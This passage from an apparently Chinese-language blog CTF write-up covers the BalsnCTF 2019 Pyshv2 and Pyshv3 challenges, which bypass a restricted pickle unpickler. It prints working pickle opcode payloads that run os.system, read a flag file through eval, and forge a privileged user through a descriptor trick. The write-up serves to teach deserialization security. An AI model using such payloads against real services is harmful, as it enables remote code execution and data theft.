+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">csys</span><br><span class="line">modules</span><br><span class="line">p100</span><br><span class="line">S<span class="string">'sys'</span></span><br><span class="line">g100</span><br><span class="line">scsys</span><br><span class="line"><span class="built_in">get</span></span><br><span class="line">(S<span class="string">'os'</span></span><br><span class="line">tRp101</span><br><span class="line"><span class="number">0</span>S<span class="string">'sys'</span></span><br><span class="line">g101</span><br><span class="line">scsys</span><br><span class="line"><span class="keyword">system</span></span><br><span class="line">(S<span class="string">'dir'</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<h3 id="BalsnCTF-2019-Pyshv2"><a href="#BalsnCTF-2019-Pyshv2" class="headerlink" title="BalsnCTF 2019 Pyshv2"></a>BalsnCTF 2019 Pyshv2</h3><blockquote>
+<p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv2</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        module = __import__(module)</span><br><span class="line">        <span class="keyword">return</span> getattr(module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py 为空</span></span><br></pre></td></tr></table></figure>
+
+<p>真会玩，给你一个空模块：），先看下空模块有哪些内置方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs = __import__(<span class="string">'structs'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>structs</span><br><span class="line">&lt;module <span class="string">'structs'</span> <span class="keyword">from</span> <span class="string">'C:\\Users\\wywwzjj\\structs.py'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(structs)</span><br><span class="line">[<span class="string">'__builtins__'</span>, <span class="string">'__cached__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__loader__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'__spec__'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__builtins__'</span>)[<span class="string">'eval'</span>]</span><br><span class="line">&lt;built-<span class="keyword">in</span> function eval&gt;</span><br></pre></td></tr></table></figure>
+
+<p>好了，问题又转变为如何获取键值，还是比较艰难。</p>
+<p>查文档时又发现了一个东西，原来 <code>__import__</code> 可被覆盖。</p>
+<blockquote>
+<p><code>__import__</code>(<em>name</em>, <em>globals=None</em>, <em>locals=None</em>, <em>fromlist=()</em>, <em>level=0</em>)</p>
+<p>此函数会由 <a href="https://docs.python.org/zh-cn/3/reference/simple_stmts.html#import" target="_blank" rel="noopener"><code>import</code></a> 语句发起调用。 它可以被替换 (通过导入 <a href="https://docs.python.org/zh-cn/3/library/builtins.html#module-builtins" target="_blank" rel="noopener"><code>builtins</code></a> 模块并赋值给 <code>builtins.__import__</code>) 以便修改 <code>import</code> 语句的语义，但是 <strong>强烈</strong> 不建议这样做，因为使用导入钩子 (参见 <a href="https://www.python.org/dev/peps/pep-0302" target="_blank" rel="noopener"><strong>PEP 302</strong></a>) 通常更容易实现同样的目标，并且不会导致代码问题，因为许多代码都会假定所用的是默认实现。 同样也不建议直接使用 <a href="https://docs.python.org/zh-cn/3/library/functions.html#__import__" target="_blank" rel="noopener"><code>__import__()</code></a> 而应该用 <a href="https://docs.python.org/zh-cn/3/library/importlib.html#importlib.import_module" target="_blank" rel="noopener"><code>importlib.import_module()</code></a>。</p>
+</blockquote>
+<p>那该覆盖成什么函数呢？最好是 <code>__import__(module)</code> 后能返回字典的函数。</p>
+<p>只能从内置函数下手了，一个一个试吧，发现没一个能用的。</p>
+<p>后来又想起还有一堆魔术方法没有试，又是一篇广阔的天地。</p>
+<p><a href="https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html" target="_blank" rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p>
+<p>这个 <code>__getattribute__</code> 恰好能符合我们的要求，真棒。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure>
+
+<p>再理下思路：（伪代码）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = getattr(structs, <span class="string">'__builtins__'</span>)  	 <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)  		 <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = __import__(structs)				 <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)  			 	 	 <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure>
+
+<p>转换为 pickle：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line"><span class="number">0</span>cstructs</span><br><span class="line">__dict__</span><br><span class="line">S<span class="string">'structs'</span></span><br><span class="line">cstructs</span><br><span class="line">__builtins__						<span class="meta"># 先添加 structs 属性</span></span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S<span class="string">'__import__'</span></span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S<span class="string">'eval'</span></span><br><span class="line">tR(S<span class="string">'print(open("../flag").read())'</span>   <span class="meta"># 这里已经不能 __import__(<span class="string">'os'</span>) 了，能继续执行命令吗：）</span></span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>
+
+<h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote>
+<p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure>
+
+<p><code>RestrictedUnpickler</code> 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p>
+<p>注意到，在 <code>cmd_flag()</code> 中，<code>self.user.privileged</code> 只要就符合条件将输出 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># 这个有点猛，后面还有赋值，没法直接覆盖了</span></span><br></pre></td></tr></table></figure>
+
+<p>魔术方法列表中可以看到，给属性赋值时，用的是 <code>__setattr__(self, name)</code>，能不能把这个干掉？</p>
+<p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 <code>privileged</code> ，同时又不干扰 <code>flag</code>？</p>
+<p>继续在魔术方法里寻找，突然看到了一个<code>创建描述符对象</code>里有 <code>__set__</code> 方法，会不会有点关系呢。</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p>
+<blockquote>
+<p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，<code>a.x</code> 的查找顺序会从 <code>a.__dict__[&#39;x&#39;]</code> 开始，然后是 <code>type(a).__dict__[&#39;x&#39;]</code>，接下来依次查找 <code>type(a)</code> 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 </p>
+</blockquote>
+<p>关于描述符的讲解还可以看下这文章：<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+<p>可清楚的看到，对属性 <code>x</code> 的操作都被 “hook” 住了，而 <code>y</code> 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 <code>RevealAccess</code>，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
+
+<p>把这个过程转为 pickle：</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(<span class="name">I111</span></span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(<span class="name">N</span>&#125;S'__set__'</span><br><span class="line">g100</span><br><span class="line">sS'privileged'</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+
+<p>看一下结果：</p>
+<p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p>
+<p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p>
